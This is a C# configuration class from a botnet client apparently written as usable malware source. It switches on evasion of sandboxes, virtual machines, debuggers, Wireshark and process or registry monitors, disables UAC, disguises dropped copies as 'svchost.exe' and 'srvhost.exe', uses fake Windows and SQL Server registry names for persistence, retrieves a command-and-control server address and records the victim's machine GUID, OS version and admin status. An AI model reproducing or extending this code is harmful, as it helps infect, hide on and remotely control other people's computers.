using BotNet.Services;
using System;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace BotNet
{
    public static class Configure
    {
        private static Instant _instantService = new Instant();
        public static bool AntiSandboxie = true;
        public static bool AntiDebugger = true;
        public static bool AntiEmulator = true;
        public static bool AntiFilemon = true;
        public static bool AntiNetstat = true;
        public static bool AntiNetworkmon = true;
        public static bool AntiProcessmon = true;
        public static bool AntiRegmon = true;
        public static bool AntiTCPView = true;
        public static bool AntiVm = true;
        public static bool AntiWireshark = true;
        public static bool DisableUAC = true;
        public static bool AntiPH = true;
        public static string TmpName = "SystemDrive.exe";
        public static string[] FileName = new string[2] { "srvhost.exe", "svchost.exe" };
        public static string[] RegName = new string[2] { "Windows-Server-Driver", "Microsoft SQL Server 2016" };
        public static string[] FilePath = new string[2];
        public static string ServerAddress = _instantService.GetServerAddress();
        public static string BotVersion = "1.0";
        public static int ConnectionInterval = 10; // 1000ms = 1sec
        public static int PersistentInterval = 60; // 1000ms = 1sec
        public static int CopyInterval = 20; // 1000ms = 1sec
        public static string HWID = Spy.machineguid;
        public static string WinVersion = Spy.osvers;
        public static string PCName = Environment.MachineName;
        public static bool AdminStatus = _instantService.IsAdmin();
    }
}
